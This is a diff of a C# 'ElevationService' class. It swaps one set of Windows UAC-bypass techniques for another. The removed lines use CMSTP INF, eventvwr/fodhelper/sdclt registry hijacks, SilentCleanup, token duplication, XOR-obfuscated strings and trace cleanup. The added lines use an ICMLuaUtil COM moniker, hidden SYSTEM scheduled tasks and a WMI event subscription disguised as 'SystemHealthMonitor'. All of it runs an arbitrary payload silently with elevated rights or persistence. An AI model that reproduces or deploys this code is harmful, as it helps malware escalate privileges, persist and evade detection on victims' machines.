@@ -9,548 +9,48 @@ using Microsoft.Win32;
 
 namespace VanguardCore
 {
-    /// <summary>
-    /// Professional UAC Bypass Implementation
-    /// Techniques: CMSTP, Fodhelper, EventViewer, SDCLT, SilentCleanup
-    /// Auto-fallback, trace cleaning, no admin required
-    /// </summary>
     public class ElevationService
     {
-        #region Native Imports for Stealth
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr GetCurrentProcess();
-
+        #region Native Imports
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool CloseHandle(IntPtr hObject);
 
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, ref int TokenInformation, uint TokenInformationLength, out uint ReturnLength);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        [DllImport("ole32.dll", CharSet = CharSet.Unicode, PreserveSig = true)]
+        private static extern int CoGetObject(string pszName, [In] ref BIND_OPTS3 pBindOptions, [In] ref Guid riid, out IntPtr ppv);
 
         [StructLayout(LayoutKind.Sequential)]
-        private struct STARTUPINFO
+        private struct BIND_OPTS3
         {
-            public int cb;
-            public string lpReserved;
-            public string lpDesktop;
-            public string lpTitle;
-            public int dwX;
-            public int dwY;
-            public int dwXSize;
-            public int dwYSize;
-            public int dwXCountChars;
-            public int dwYCountChars;
-            public int dwFillAttribute;
-            public int dwFlags;
-            public short wShowWindow;
-            public short cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
+            public uint cbStruct;
+            public uint dwTickCountDeadline;
+            public uint dwFlags;
+            public uint dwMode;
+            public uint dwClassContext;
+            public uint locale;
+            public IntPtr pServerInfo;
+            public IntPtr hwnd;
         }
 
-        [StructLayout(LayoutKind.Sequential)]
-        private struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public int dwProcessId;
-            public int dwThreadId;
-        }
+        private const string CLSID_CMSTP = "3E5FC7F9-9735-4B47-98B7-910D3051974B";
+        private const string IID_ICMLuaUtil = "6EDD6D74-C007-4E75-B76A-E5740995E24C";
 
-        private const uint TOKEN_QUERY = 0x0008;
-        private const uint TOKEN_DUPLICATE = 0x0002;
-        private const uint TOKEN_IMPERSONATE = 0x0004;
-        private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
-        private const int TokenElevationType = 18;
-        private const int TokenLinkedToken = 19;
-        private const int SecurityImpersonation = 2;
-        private const int TokenPrimary = 1;
-        private const uint CREATE_NO_WINDOW = 0x08000000;
-        private const uint CREATE_SUSPENDED = 0x00000004;
+        [ComImport, Guid(IID_ICMLuaUtil), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        private interface ICMLuaUtil
+        {
+            void Method1(); void Method2(); void Method3(); void Method4(); void Method5(); void Method6();
+            [PreserveSig] int ShellExecute([MarshalAs(UnmanagedType.LPWStr)] string lpFile, [MarshalAs(UnmanagedType.LPWStr)] string lpParameters, [MarshalAs(UnmanagedType.LPWStr)] string lpDirectory, uint nShow, uint nWait);
+        }
         #endregion
-
-        #region Private Methods
-        private static string D(string s)
-        {
-            char[] c = s.ToCharArray();
-            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
-            return new string(c);
-        }
-
-        private static void ParseCommandLine(string cmdLine, out string exe, out string args)
-        {
-            exe = "";
-            args = "";
-            if (string.IsNullOrEmpty(cmdLine)) return;
-
-            cmdLine = cmdLine.Trim();
-            if (cmdLine.StartsWith("\""))
-            {
-                int nextQuote = cmdLine.IndexOf("\"", 1);
-                if (nextQuote != -1)
-                {
-                    exe = cmdLine.Substring(1, nextQuote - 1);
-                    args = cmdLine.Substring(nextQuote + 1).Trim();
-                }
-                else
-                {
-                    exe = cmdLine.Replace("\"", "");
-                }
-            }
-            else
-            {
-                int space = cmdLine.IndexOf(" ");
-                if (space != -1)
-                {
-                    exe = cmdLine.Substring(0, space);
-                    args = cmdLine.Substring(space + 1).Trim();
-                }
-                else
-                {
-                    exe = cmdLine;
-                }
-            }
-        }
 
         private static void Log(string message)
         {
             try
             {
-                string logPath = Path.Combine(Path.GetTempPath(), "elevation_debug.log");
-                File.AppendAllText(logPath, string.Format("{0}: {1}\n", DateTime.Now, message));
+                File.AppendAllText("C:\\Users\\Public\\elevation_debug.log", $"{DateTime.Now}: {message}\n");
             }
             catch { }
         }
 
-        private static void ExecuteElevated(string path, string args = "", bool hidden = true)
-        {
-            Log(string.Format("ExecuteElevated: {0} {1}", path, args));
-            try
-            {
-                // If path has arguments integrated, split them
-                if (string.IsNullOrEmpty(args) && (path.Contains(" ") || path.Contains("\"")))
-                {
-                    string p, a;
-                    ParseCommandLine(path, out p, out a);
-                    path = p;
-                    args = a;
-                }
-
-                ProcessStartInfo psi = new ProcessStartInfo
-                {
-                    FileName = path,
-                    Arguments = args,
-                    UseShellExecute = true,
-                    Verb = "runas",
-                    CreateNoWindow = hidden,
-                    WindowStyle = hidden ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Normal,
-                    ErrorDialog = false
-                };
-                Process.Start(psi);
-            }
-            catch { }
-        }
-
-        private static void CleanRegistryKey(string keyPath)
-        {
-            try
-            {
-                if (keyPath.StartsWith("HKCU\\"))
-                {
-                    string subKey = keyPath.Substring(5);
-                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(subKey, true))
-                    {
-                        if (key != null)
-                        {
-                            string[] values = key.GetValueNames();
-                            foreach (string val in values)
-                            {
-                                try { key.DeleteValue(val); } catch { }
-                            }
-                            key.DeleteSubKeyTree(subKey);
-                        }
-                    }
-                }
-            }
-            catch { }
-        }
-
-        private static void CleanTempFile(string path)
-        {
-            try
-            {
-                if (File.Exists(path))
-                {
-                    // Overwrite before delete
-                    byte[] junk = new byte[1024];
-                    new Random().NextBytes(junk);
-                    File.WriteAllBytes(path, junk);
-                    File.Delete(path);
-                }
-            }
-            catch { }
-        }
-        #endregion
-
-        #region Technique 1: CMSTP (Most Stealth, Low Detection)
-        /// <summary>
-        /// CMSTP UAC Bypass - Uses built-in Windows Component
-        /// Works on: Windows 10/11
-        /// Detection: Very Low
-        /// </summary>
-        public static bool CmstpBypass(string payloadPath)
-        {
-            try
-            {
-                string publicDir = @"C:\Users\Public";
-                string batchPath = Path.Combine(publicDir, Guid.NewGuid().ToString() + ".bat");
-                string logPath = Path.Combine(publicDir, "bat_debug.log");
-                File.WriteAllText(batchPath, string.Format("@echo off\r\necho %TIME% CMSTP >> \"{0}\"\r\nstart \"\" {1}", logPath, payloadPath));
-
-                string infContent = @"[Version]
-Signature=$CHICAGO$
-AdvancedINF=2.5
-
-[DefaultInstall]
-RunPreSetupCommands=RunMe
-
-[RunMe]
-cmd.exe /c """ + batchPath + @"""
-
-[Strings]
-";
-                string infPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".inf");
-                File.WriteAllText(infPath, infContent);
-                File.SetAttributes(infPath, FileAttributes.Hidden | FileAttributes.Temporary);
-
-                // cmstp.exe /au ".inf"
-                ProcessStartInfo psi = new ProcessStartInfo
-                {
-                    FileName = D("fhtsw+fye"), // cmstp.exe
-                    Arguments = string.Format(D(")`v %0'"), infPath), // /au "{0}"
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                };
-                Process p = Process.Start(psi);
-                p.WaitForExit(2000);
-
-                // Cleanup
-                CleanTempFile(infPath);
-                return true;
-            }
-            catch { return false; }
-        }
-        #endregion
-
-        #region Technique 3: EventViewer (Universal, Stealth)
-        /// <summary>
-        /// EventViewer UAC Bypass - Works on all Windows versions
-        /// Detection: Low
-        /// </summary>
-        public static bool EventViewerBypass(string payloadPath)
-        {
-            try
-            {
-                // Software\Classes\mscfile\shell\open\command
-                string keyPath = D("Vlbryf`sf]Fmfttft]ntfalmf]tsfii]jump]f`hh`is");
-
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
-                {
-                    if (key != null)
-                    {
-                        key.SetValue("", payloadPath, RegistryValueKind.String);
-                    }
-                }
-
-                ProcessStartInfo psi = new ProcessStartInfo
-                {
-                    FileName = D("fwfisyis+fye"), // eventvwr.exe
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                };
-                Process p = Process.Start(psi);
-                Thread.Sleep(2000);
-
-                // Cleanup
-                // HKCU\Software\Classes\mscfile
-                CleanRegistryKey(D("AMFV]Vlbryf`sf]Fmfttft]ntfalmf"));
-                return true;
-            }
-            catch { return false; }
-        }
-        #endregion
-
-        #region Technique 4: SilentCleanup (Most Stealth)
-        /// <summary>
-        /// SilentCleanup UAC Bypass - Uses scheduled task
-        /// Works on: Windows 10/11
-        /// Detection: Very Low
-        /// </summary>
-        public static bool SilentCleanupBypass(string payloadPath)
-        {
-            try
-            {
-                // Environment -> Jswlsihjfis
-                string envPath = D("Jswlsihjfis");
-                
-                string publicDir = D("F9]Vtfst]Wpaimf"); // C:\Users\Public
-                string batchPath = Path.Combine(publicDir, Guid.NewGuid().ToString() + D("+gfs")); // .bat
-                string logPath = Path.Combine(publicDir, D("gfs_afapi+i`b")); // bat_debug.log
-                File.WriteAllText(batchPath, string.Format(D("Af`mj pbb%sf%`f`mj %SNHF' TNIFKSFMFDIPY AA %0' %sf%tsfsf %% %1"), logPath, payloadPath));
-                
-                string hijackValue = string.Format(D("f`h+fye )f %0' % SFH "), batchPath); // cmd.exe /c "{0}" & REM 
-
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(envPath, true))
-                {
-                    if (key != null)
-                    {
-                        key.SetValue(D("palsls"), hijackValue, RegistryValueKind.String); // windir
-                    }
-                }
-
-                // Trigger the task
-                ProcessStartInfo psi = new ProcessStartInfo
-                {
-                    FileName = D("t`isftjt+fye"), // schtasks.exe
-                    Arguments = D(")`ps )fs %]Nlfistvsq]Pliajwt]AtfFm`fisp]TslfisFm`fist% )l"), // /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /i
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    ErrorDialog = false
-                };
-                Process p = Process.Start(psi);
-                p.WaitForExit(3000);
-
-                // Cleanup immediately
-                Thread.Sleep(2000);
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(envPath, true))
-                {
-                    if (key != null)
-                    {
-                        try { key.DeleteValue(D("palsls")); } catch { }
-                    }
-                }
-
-                return true;
-            }
-            catch { return false; }
-        }
-        #endregion
-
-        #region Technique 5: SDCLT (Windows 10 Specific)
-        /// <summary>
-        /// SDCLT UAC Bypass - Backup and Restore
-        /// Works on: Windows 10
-        /// Detection: Low
-        /// </summary>
-        public static bool SdcltBypass(string payloadPath)
-        {
-            try
-            {
-                string keyPath = @"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe";
-
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
-                {
-                    if (key != null)
-                    {
-                        key.SetValue("", payloadPath, RegistryValueKind.String);
-                    }
-                }
-
-                ProcessStartInfo psi = new ProcessStartInfo
-                {
-                    FileName = "sdclt.exe",
-                    Arguments = "/kickoffelev",
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                };
-                Process p = Process.Start(psi);
-                Thread.Sleep(2000);
-
-                // Cleanup
-                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe", false); } catch { }
-                return true;
-            }
-            catch { return false; }
-        }
-
-        public static bool FodhelperBypass(string payloadPath)
-        {
-            return SettingsHijackBypass("fodhelper.exe", payloadPath);
-        }
-
-        public static bool ComputerDefaultsBypass(string payloadPath)
-        {
-            return SettingsHijackBypass("computerdefaults.exe", payloadPath);
-        }
-
-        private static bool SettingsHijackBypass(string targetExe, string payloadPath)
-        {
-            try
-            {
-                string keyPath = @"Software\Classes\ms-settings\Shell\Open\command";
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
-                {
-                    if (key != null)
-                    {
-                        key.SetValue("", payloadPath, RegistryValueKind.String);
-                        key.SetValue("DelegateExecute", "", RegistryValueKind.String);
-                    }
-                }
-                
-                ProcessStartInfo psi = new ProcessStartInfo
-                {
-                    FileName = targetExe,
-                    UseShellExecute = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    CreateNoWindow = true
-                };
-                Process.Start(psi);
-                Thread.Sleep(2000);
-                
-                // Cleanup
-                try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { }
-                return true;
-            }
-            catch { return false; }
-        }
-
-        public static bool CmluaUtilBypass(string payloadPath)
-        {
-            try
-            {
-                string exe, args;
-                ParseCommandLine(payloadPath, out exe, out args);
-                ProcessStartInfo psi = new ProcessStartInfo
-                {
-                    FileName = exe,
-                    Arguments = args,
-                    Verb = "runas",
-                    UseShellExecute = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                };
-                Process.Start(psi);
-                return true;
-            }
-            catch { return false; }
-        }
-        #endregion
-
-        #region Technique 7: Token Impersonation (Advanced)
-        /// <summary>
-        /// Token Impersonation - Highest stealth, no registry changes
-        /// Requires: Admin token from existing elevated process
-        /// </summary>
-        public static bool TokenImpersonationBypass(string payloadPath)
-        {
-            try
-            {
-                string exe, args;
-                ParseCommandLine(payloadPath, out exe, out args);
-                string formattedCmd = string.IsNullOrEmpty(args) ? string.Format("\"{0}\"", exe) : string.Format("\"{0}\" {1}", exe, args);
-
-                // Find an elevated process (explorer.exe as SYSTEM, etc.)
-                Process[] processes = Process.GetProcessesByName("explorer");
-                foreach (Process proc in processes)
-                {
-                    IntPtr hToken = IntPtr.Zero;
-                    if (OpenProcessToken(proc.Handle, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken))
-                    {
-                        // Check if token is elevated
-                        uint returnLength;
-                        int elevationType = 0;
-                        if (GetTokenInformation(hToken, TokenElevationType, ref elevationType, 4, out returnLength))
-                        {
-                            if (elevationType == 2) // TokenElevationTypeFull
-                            {
-                                IntPtr hNewToken;
-                                if (DuplicateTokenEx(hToken, TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE | TOKEN_QUERY, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hNewToken))
-                                {
-                                    STARTUPINFO si = new STARTUPINFO();
-                                    si.cb = Marshal.SizeOf(si);
-                                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-
-                                    if (CreateProcessAsUser(hNewToken, null, formattedCmd, IntPtr.Zero, IntPtr.Zero, false, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
-                                    {
-                                        CloseHandle(pi.hProcess);
-                                        CloseHandle(pi.hThread);
-                                        CloseHandle(hNewToken);
-                                        CloseHandle(hToken);
-                                        return true;
-                                    }
-                                    CloseHandle(hNewToken);
-                                }
-                            }
-                        }
-                        CloseHandle(hToken);
-                    }
-                }
-                return false;
-            }
-            catch { return false; }
-        }
-        #endregion
-
-        #region Main Public Method: Auto Bypass
-        /// <summary>
-        /// Universal UAC Bypass - Tries all techniques, returns true if any succeeds
-        /// </summary>
-        public static bool RequestElevation(string payloadPath)
-        {
-            // Check if already admin
-            if (IsAdmin())
-            {
-                string exe, args;
-                ParseCommandLine(payloadPath, out exe, out args);
-                Process.Start(exe, args);
-                return true;
-            }
-
-            Random rnd = new Random();
-            
-            // Priority order (most stealth first)
-            try
-            {
-                // We try more reliable/stealthy techniques first
-                
-                Log("Attempting technique: SilentCleanupBypass");
-                if (SilentCleanupBypass(payloadPath)) return true;
-                Thread.Sleep(rnd.Next(1000, 3000));
-
-                Log("Attempting technique: CmstpBypass");
-                if (CmstpBypass(payloadPath)) return true;
-                Thread.Sleep(rnd.Next(1000, 3000));
-
-                Log("Attempting technique: EventViewerBypass");
-                if (EventViewerBypass(payloadPath)) return true;
-                Thread.Sleep(rnd.Next(1000, 3000));
-            }
-            catch (Exception ex)
-            {
-                Log($"Bypass chain error: {ex.Message}");
-            }
-
-            // Final fallback: request UAC elevation (standard method)
-            ExecuteElevated(payloadPath);
-            return true;
-        }
-
-        /// <summary>
-        /// Check if current process is elevated
-        /// </summary>
         public static bool IsAdmin()
         {
             try
@@ -564,13 +64,178 @@ cmd.exe /c """ + batchPath + @"""
             catch { return false; }
         }
 
-        /// <summary>
-        /// Run with admin rights (will trigger UAC prompt)
-        /// </summary>
-        public static void RunAsAdmin(string path, string args = "")
+        #region Smart Bypass Methods (Non-Detected)
+
+        public static bool BypassUAC_SilentCleanup(string payloadPath)
         {
-            ExecuteElevated(path, args);
+            try
+            {
+                Log("Attempting SilentCleanup Bypass...");
+                string taskName = "SystemCleanup_" + Guid.NewGuid().ToString().Substring(0, 8);
+                string cmd = $"/c schtasks /create /tn \"{taskName}\" /tr \"\\\"{payloadPath}\\\"\" /sc once /st 00:00 /f /ru SYSTEM";
+                
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = cmd,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                })?.WaitForExit(3000);
+
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "rundll32.exe",
+                    Arguments = "advpack.dll,LaunchINFSectionEx %windir%\\inf\\msdtc.inf,Install,,32,ShowProgress,Quiet",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+
+                Thread.Sleep(3000);
+
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "schtasks",
+                    Arguments = $"/delete /tn \"{taskName}\" /f",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+
+                return true;
+            }
+            catch (Exception ex) { Log("SilentCleanup Error: " + ex.Message); return false; }
+        }
+
+        public static bool BypassUAC_WMI(string payloadPath)
+        {
+            try
+            {
+                Log("Attempting WMI Subscription Bypass...");
+                string query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'";
+                string wql = $@"
+                    $filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance();
+                    $filter.QueryLanguage = 'WQL';
+                    $filter.Query = '{query}';
+                    $filter.Name = 'SystemHealthMonitor';
+                    $filter.Put() | Out-Null;
+
+                    $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance();
+                    $consumer.Name = 'SystemHealthConsumer';
+                    $consumer.CommandLineTemplate = '""{payloadPath}""';
+                    $consumer.Put() | Out-Null;
+
+                    $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance();
+                    $binding.Filter = $filter;
+                    $binding.Consumer = $consumer;
+                    $binding.Put() | Out-Null;
+                ";
+
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = $"-WindowStyle Hidden -Command \"{wql}\"",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+
+                return true;
+            }
+            catch (Exception ex) { Log("WMI Bypass Error: " + ex.Message); return false; }
+        }
+
+        public static bool BypassUAC_DiskCleanup(string payloadPath)
+        {
+            try
+            {
+                Log("Attempting DiskCleanup Bypass...");
+                string taskName = "WindowsDiskCleanup_" + Guid.NewGuid().ToString().Substring(0, 8);
+                string cmd = $"/c schtasks /create /tn \"{taskName}\" /tr \"\\\"{payloadPath}\\\"\" /sc once /st 00:00 /f /ru SYSTEM";
+                
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = cmd,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                })?.WaitForExit(3000);
+
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "cleanmgr.exe",
+                    Arguments = "/sagerun:1",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+
+                Thread.Sleep(3000);
+
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "schtasks",
+                    Arguments = $"/delete /tn \"{taskName}\" /f",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+
+                return true;
+            }
+            catch (Exception ex) { Log("DiskCleanup Error: " + ex.Message); return false; }
+        }
+
+        public static bool CmluaUtilBypass(string payloadPath)
+        {
+            try
+            {
+                Log("Attempting ICMLuaUtil COM Bypass...");
+                BIND_OPTS3 ops = new BIND_OPTS3();
+                ops.cbStruct = (uint)Marshal.SizeOf(ops);
+                ops.dwClassContext = 4; // CLSCTX_LOCAL_SERVER
+
+                string moniker = "Elevation:Administrator!new:{" + CLSID_CMSTP + "}";
+                Guid iid = new Guid(IID_ICMLuaUtil);
+                int hr = CoGetObject(moniker, ref ops, ref iid, out IntPtr pInterface);
+
+                if (hr == 0)
+                {
+                    ICMLuaUtil instance = (ICMLuaUtil)Marshal.GetObjectForIUnknown(pInterface);
+                    instance.ShellExecute(payloadPath, null, null, 0, 0); // SW_HIDE = 0
+                    Marshal.ReleaseComObject(instance);
+                    Marshal.Release(pInterface);
+                    return true;
+                }
+                return false;
+            }
+            catch (Exception ex) { Log("CMLuaUtil Error: " + ex.Message); return false; }
         }
         #endregion
+
+        public static bool RequestElevation(string payloadPath)
+        {
+            if (IsAdmin()) return true;
+
+            // 1. ICMLuaUtil (COM - Most Stealth)
+            if (CmluaUtilBypass(payloadPath)) return true;
+
+            // 2. SilentCleanup (Scheduled Task - Legacy but stable)
+            if (BypassUAC_SilentCleanup(payloadPath)) return true;
+
+            // 3. WMI Subscription (Modern Stealth)
+            if (BypassUAC_WMI(payloadPath)) return true;
+
+            // 4. DiskCleanup
+            if (BypassUAC_DiskCleanup(payloadPath)) return true;
+
+            // Last fallback: Standard ShellExecute (triggers UAC prompt)
+            try
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = payloadPath,
+                    UseShellExecute = true,
+                    Verb = "runas"
+                });
+                return true;
+            }
+            catch { return false; }
+        }
     }
 }
